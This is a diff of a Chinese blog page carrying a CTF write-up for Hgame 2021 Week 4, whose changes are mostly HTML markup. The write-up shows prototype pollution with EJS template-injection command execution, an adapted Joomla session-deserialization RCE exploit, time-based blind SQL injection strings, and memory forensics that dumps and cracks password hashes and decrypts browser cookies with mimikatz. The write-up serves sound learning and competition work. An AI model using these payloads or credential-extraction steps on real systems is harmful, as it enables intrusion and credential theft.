@@ -524,20 +524,16 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="引言">引言</h2>
-<p><strong>Hgame 2021 Week 4</strong></p>
+                <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>Hgame 2021 Week 4</strong></p>
 <p>喵呜，转眼间 Hgame 就到了最后一周，寒假也结束了。</p>
 <p>这周题目好难啊，还有就收假了比较忙，后面就没时间看题了。</p>
-<p>问题不大*（喵喵爬走*</p>
-<h2 id="Web">Web</h2>
-<h3 id="漫无止境的星期日">漫无止境的星期日</h3>
-<blockquote>
-<p>在我长大的这个城市里，每个人都有超越寻常的特长。我可以重启这个世界（是的整个世界），不仅仅是将时钟往回拨，而是将世界的一切，从原子层面恢复到一天前的状态。只有看到有人在哭泣时，我才会重启。包括我的记忆，全部重启。但是，不用担心，我的搭档有绝对记忆。<br>
-然而，我们被困在了这一天里，漫无止境的星期日。有情报说，只要我们重启了这一天，“MacGuffin” 便会出现在我们面前，并且它会满足我们的任何愿望。</p>
-<p><a target="_blank" rel="noopener" href="http://macguffin.0727.site:5000/">http://macguffin.0727.site:5000/</a></p>
+<p>问题不大<em>（喵喵爬走</em></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="漫无止境的星期日"><a href="#漫无止境的星期日" class="headerlink" title="漫无止境的星期日"></a>漫无止境的星期日</h3><blockquote>
+<p>在我长大的这个城市里，每个人都有超越寻常的特长。我可以重启这个世界（是的整个世界），不仅仅是将时钟往回拨，而是将世界的一切，从原子层面恢复到一天前的状态。只有看到有人在哭泣时，我才会重启。包括我的记忆，全部重启。但是，不用担心，我的搭档有绝对记忆。<br> 然而，我们被困在了这一天里，漫无止境的星期日。有情报说，只要我们重启了这一天，“MacGuffin” 便会出现在我们面前，并且它会满足我们的任何愿望。</p>
+<p><a target="_blank" rel="noopener" href="http://macguffin.0727.site:5000/">http://macguffin.0727.site:5000/</a> </p>
 </blockquote>
 <p>提示有源码。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173405858.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173405858.png"></p>
 <p>下载下来一看，啊 NodeJS，好耶！</p>
 <p><code>app.js</code></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
@@ -664,7 +660,7 @@ app<span class="token punctuation">.</span><span class="token function">listen</
 <p>回显的话可以通过这个 <code>wishes</code> 来进行。</p>
 <p>随意发个包，可以发现用的是 <code>application/x-www-form-urlencoded</code> 传参。</p>
 <p>但是为了构造原型链污染，我们需要用 object，很好它在第 9 行这里用了 <code>json</code>，那我们就可以改一下 content-type 污染了。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173656117.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221173656117.png"></p>
 <p>payload:</p>
 <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token property">"discription"</span><span class="token operator">:</span> <span class="token string">"MiaoTony"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"crying"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174250281.png" alt="payload"></p>
@@ -673,16 +669,15 @@ app<span class="token punctuation">.</span><span class="token function">listen</
 <p>参考 <a href="https://miaotony.xyz/2020/11/23/CTF_2020NJUPTCTF/#JS-world">之前 NCTF 2020</a> 的 payload. 嗯是个通用的 payload。</p>
 <pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls -al /'</span><span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>打过去，先看看根目录有啥。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174529673.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174529673.png"></p>
 <p>很好，看到 flag 了。</p>
 <p>再走一遍流程读 flag。</p>
 <pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%-</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span> </span><span class="token delimiter punctuation">%&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174649455.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210221174649455.png"></p>
 <p><code>hgame{nOdeJs_Prot0type_ls_fUnny&amp;Ejs_Templ@te_Injection}</code></p>
-<h3 id="joomlaJoomla">joomlaJoomla!!!</h3>
-<blockquote>
+<h3 id="joomlaJoomla"><a href="#joomlaJoomla" class="headerlink" title="joomlaJoomla!!!!!"></a>joomlaJoomla!!!!!</h3><blockquote>
 <p>这是一个简单的题目描述。附件：<a target="_blank" rel="noopener" href="http://1.oss.hgame2021.vidar.club/joomlaJoomla.zip">http://1.oss.hgame2021.vidar.club/joomlaJoomla.zip</a></p>
-<p><a target="_blank" rel="noopener" href="http://9bf30fbbcb.joomla.r4u.top:6788/">http://9bf30fbbcb.joomla.r4u.top:6788/</a></p>
+<p><a target="_blank" rel="noopener" href="http://9bf30fbbcb.joomla.r4u.top:6788/">http://9bf30fbbcb.joomla.r4u.top:6788/</a> </p>
 </blockquote>
 <p>啊 2015 年巨古老的框架了。</p>
 <p>一搜就发现有 Session 反序列化漏洞。</p>
@@ -690,17 +685,17 @@ app<span class="token punctuation">.</span><span class="token function">listen</
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/83120">session反序列化代码执行漏洞分析[Joomla RCE]</a></p>
 <p>BTW, <a target="_blank" rel="noopener" href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></p>
 <p>或者 用 searchsploit 搜一下也能发现。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043745645.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043745645.png"></p>
 <p>就是 Joomla 自己实现了一种 session 序列化的格式，通过 XFF 或者 User-Agent 可以注入到数据库。</p>
 <p>然而用现成的 exp 直接打过去发现打不通。</p>
 <p>看文件修改日期就能发现改了代码。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226042806386.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226042806386.png"></p>
 <p>根据 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html">Joomla远程代码执行漏洞分析（总结）</a></p>
 <p>对比发现增加了一部分代码。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043020174.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043020174.png"></p>
 <p><strong>可以发现把第一个出现的 <code>|</code> 给替换为空了。</strong></p>
 <p>那我们在 exp 最开始加个 <code>|</code>，或者双写 <code>|</code> 就完事了！</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043523338.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043523338.png"></p>
 <p>然后生成 payload，拿 flag。</p>
 <p><em><strong>Python 2</strong></em></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
@@ -743,20 +738,18 @@ pl <span class="token operator">=</span> generate_payload<span class="token punc
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043627353.png" alt="根目录"></p>
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226043603378.png" alt="flag"></p>
 <p><code>hgame{WelCoME~TO-ThIs_Re4Lw0RLD}</code></p>
-<h3 id="Unforgettable">Unforgettable</h3>
-<blockquote>
-<p>Liki 更新了她的 TodoList, 终于记住了很多不能忘记的事情<br>
-PS: flag 内容中的字母都为小写，请自行用 hgame{} 包裹得到的 flag</p>
-<p><a target="_blank" rel="noopener" href="https://unforgettable.liki.link/">https://unforgettable.liki.link/</a></p>
+<h3 id="Unforgettable"><a href="#Unforgettable" class="headerlink" title="Unforgettable"></a>Unforgettable</h3><blockquote>
+<p>Liki 更新了她的 TodoList, 终于记住了很多不能忘记的事情<br>PS: flag 内容中的字母都为小写，请自行用 hgame{} 包裹得到的 flag</p>
+<p><a target="_blank" rel="noopener" href="https://unforgettable.liki.link/">https://unforgettable.liki.link/</a> </p>
 </blockquote>
 <p>这题很坑，不想上周那样存在 Flask SSTI.</p>
 <p>试了很久，突然发现相比上周多了一个 user 页面，发现这个页面上的 <code>username</code> 存在 SQL 注入。</p>
 <p>而其他页面的右上角 username 都是正常显示的（用户名原本的模样）。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180641791.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180641791.png"></p>
 <p>这个写起来就很麻烦，需要注册用户，然后登录，访问 <code>/user</code>.</p>
 <p>试了一下 username 过滤的还挺多……包括但不限于 空格 <code>=</code> <code>like</code> <code>and</code> <code>or</code> 之类的。</p>
 <p>还有一定情况注册成功了但访问 <code>/user</code> 并没有回显，反而就是个 <code>username</code>。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224165814297.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224165814297.png"></p>
 <p>后来才知道这是 <strong>SQL 二次注入</strong>。</p>
 <blockquote>
 <p><em>二次注入</em>是指已存储(数据库、文件)的用户输入被读取后再次进入到 <em>SQL</em> 查询语句中导致的注入</p>
@@ -767,18 +760,18 @@ PS: flag 内容中的字母都为小写，请自行用 hgame{} 包裹得到的 f
 <pre class="line-numbers language-none"><code class="language-none">SeleCt'+'1+2
 
 1HinrG'/**/&amp;&amp;/**/(IF(right(left((SELECT/**/GROUP_CONCAT(ffllllaaaagg)/**/FROM/**/ffflllaagggg),1),1)/**/IN/**/('''),BENCHMARK(55555555,MD5('a')),0))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180202149.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210224180202149.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">SeleCt'+'5
 
 5dPaU6'/**/&amp;&amp;/**/(IF(LENGTH((SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg))/**/IN/**/(2),BENCHMARK(55555555,MD5('a')),0))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
 <p>其实就盲注，布尔/时间盲注都行。</p>
 <p>要注册登录挺麻烦的就是了。</p>
 <p><em>（不过后来寒假么得了 没空写脚本了 emmm</em></p>
-<h2 id="Misc">Misc</h2>
-<h3 id="Akira之瞳-1">Akira之瞳-1</h3>
-<blockquote>
-<p>有人想问 Akira 为什么总喜欢用眼睛当头像，Akira 说：“我给你讲个故事吧，从前有一天一位原画师在上班，不幸的是突然起了火灾，情急之下 IT 部门把她没保存的工作 dump 了下来并传到了网上 … ”</p>
-<p><a target="_blank" rel="noopener" href="https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z">https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z</a></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Akira之瞳-1"><a href="#Akira之瞳-1" class="headerlink" title="Akira之瞳-1"></a>Akira之瞳-1</h3><blockquote>
+<p>有人想问 Akira 为什么总喜欢用眼睛当头像，Akira 说：“我给你讲个故事吧，从前有一天一位原画师在上班，不幸的是突然起了火灾，情急之下 IT 部门把她没保存的工作 dump 了下来并传到了网上 …… ”</p>
+<p><a target="_blank" rel="noopener" href="https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z">https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z</a> </p>
 </blockquote>
 <p><strong>内存取证</strong></p>
 <p>1GiB 的内存镜像啊，好大（</p>
@@ -812,7 +805,7 @@ INFO    <span class="token builtin class-name">:</span> volatility.debug    <spa
              KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xfffff78000000000L
            Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-18 09:47:25 UTC+0000
      Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-18 <span class="token number">17</span>:47:25 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Win7SP1x64</p>
+<p>Win7SP1x64 </p>
 <p>看看桌面上有啥文件。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span> <span class="token function">grep</span> Desktop
 Volatility Foundation Volatility Framework <span class="token number">2.6</span>
@@ -855,7 +848,7 @@ Volatility Foundation Volatility Framework <span class="token number">2.6</span>
 DataSectionObject 0x3ec703d0   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zip
 SharedCacheMap 0x3ec703d0   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>压缩包注释提示密码是 <code>sha256(login_password)</code></p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222001125508.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222001125508.png"></p>
 <p>于是去内存里找密码。</p>
 <p>先看看内存。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 hivelist	
@@ -887,7 +880,7 @@ Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436::
 $ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 <span class="token operator">&gt;</span> pass.txt
 $ john pass.txt --format<span class="token operator">=</span>NT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>用 john 破解得到密码为 <code>asdqwe123</code></p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222000538165.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222000538165.png"></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n asdqwe123 <span class="token operator">&gt;</span> <span class="token builtin class-name">test</span>
 $ sha256sum <span class="token builtin class-name">test</span>          
 20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3  <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -900,12 +893,9 @@ $ sha256sum <span class="token builtin class-name">test</span>
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222002346439.png" alt="flag"></p>
 <p><code>hgame{7he_f1ame_brin9s_me_end1ess_9rief}</code></p>
 <p>好耶！蹭这个机会终于学了学 volatility 的使用（（</p>
-<h3 id="Akira之瞳-2">Akira之瞳-2</h3>
-<blockquote>
-<p>…<br>
-“最后呢？”<br>
-“最后她还是没能幸免，人们在保险箱旁发现了她烧焦的尸体，打开保险箱人们发现了一个U盘，是她将回家画好的原稿带来时用的 …”</p>
-<p><a target="_blank" rel="noopener" href="https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z">https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z</a></p>
+<h3 id="Akira之瞳-2"><a href="#Akira之瞳-2" class="headerlink" title="Akira之瞳-2"></a>Akira之瞳-2</h3><blockquote>
+<p>……<br>“最后呢？”<br>“最后她还是没能幸免，人们在保险箱旁发现了她烧焦的尸体，打开保险箱人们发现了一个U盘，是她将回家画好的原稿带来时用的 ……”</p>
+<p><a target="_blank" rel="noopener" href="https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z">https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z</a> </p>
 </blockquote>
 <p>（怎么这个镜像还要大啊，2GiB…</p>
 <p>照样看镜像信息。</p>
@@ -971,8 +961,8 @@ $ volatility -f secret_work.raw --profile<span class="token operator">=</span>Wi
 <p><code>dumpme.txt</code></p>
 <pre class="line-numbers language-none"><code class="language-none">zip password is: 5trqES&amp;P43#y&amp;1TO
 And you may need LastPass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>解压 <code>secret.7z</code> 得到</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226021952159.png" alt=""></p>
+<p>解压 <code>secret.7z</code> 得到 </p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226021952159.png"></p>
 <p><code>S-</code> 开头的那玩意怎么看都像是回收站（</p>
 <p>用 LastPass 得到登录密码。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass">https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass</a></p>
@@ -1009,7 +999,7 @@ LastPassPrivateKey<span class="token operator">&lt;</span>308204BB020100300D0609
 <p>看到有个 Cookies，发现是 Sqlite 数据库，是 Chrome 存放 Cookie 的。</p>
 <p>又发现文件结尾 有个 <code>localhostVeraCrypt/</code></p>
 <p>查了一下，VeraCrypt 是一种硬盘加密工具，盲猜 container 文件就是被加密的镜像了。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226034813077.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226034813077.png"></p>
 <p>用 mimikatz 去解密 Cookies，发现需要 Masterkey。</p>
 <blockquote>
 <p>mimikatz</p>
@@ -1025,7 +1015,7 @@ Dates <span class="token builtin class-name">:</span> <span class="token number"
  * using CryptUnprotectData API
 ERROR kuhl_m_dpapi_unprotect_raw_or_blob <span class="token punctuation">;</span> NTE_BAD_KEY_STATE, needed Masterkey is: <span class="token punctuation">{</span><span class="token number">57935170</span>-beab-4565-ba79-2b09570b95a6<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这个需要的 Masterkey 正好就和 <code>S-</code> 开头的文件夹里的文件名同名。</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226030036640.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226030036640.png"></p>
 <p>然后查了一堆资料（</p>
 <blockquote>
 <p>参考：</p>
@@ -1087,12 +1077,12 @@ Cookie: <span class="token operator">!</span>bWjAqM2z<span class="token operator
 <p>得到 VeraCrypt 密钥 <code>!bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAb</code>。</p>
 <p><a target="_blank" rel="noopener" href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html</a></p>
 <p>挂载 container</p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032129235.png" alt=""></p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032201470.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032129235.png"></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032201470.png"></p>
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/ADS.jpg" alt="ADS"></p>
 <p><strong>NTFS 文件流隐写</strong></p>
 <p>参考之前写的 <a href="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/#%E5%85%B3%E4%BA%8E-NTFS-ADS-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93">关于 NTFS ADS 的一些总结</a></p>
-<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226033026103.png" alt=""></p>
+<p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226033026103.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">hgame{Which_0nly_cryin9_3yes_c4n_de5cribe}
 And you may be intertested in this bonus: https://eyes.hgame2021.cf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/2021/03/04/CTF_2021HgameWeek4/download.png" alt="https://eyes.hgame2021.cf/"></p>
@@ -1100,11 +1090,10 @@ And you may be intertested in this bonus: https://eyes.hgame2021.cf<span aria-hi
 <p><strong>哇！！！原来你们渗透都这么会玩的么！</strong></p>
 <p>BTW，查了一下，这题有点像 2019 国际赛 De1CTF DeepInReal，<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183507">参考题解</a>。</p>
 <hr>
-<h2 id="小结">小结</h2>
-<p><strong>喵呜！</strong></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>喵呜！</strong></p>
 <p><strong>Hgame 2021 完结撒花！</strong></p>
 <p>好耶，总榜第 20，没掉出第一页（爬走</p>
-<p>今年好难得坚持每周都来看题目了 233.</p>
+<p>今年好难得坚持每周都来看题目了 233. </p>
 <p>玩的还算开心，就是有点头秃。</p>
 <p>杭电的出题带师傅们也辛苦了。<strong>（这就去打出题人</strong></p>
 <p><em>（溜了溜了喵</em></p>
@@ -1659,7 +1648,7 @@ And you may be intertested in this bonus: https://eyes.hgame2021.cf<span aria-hi
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
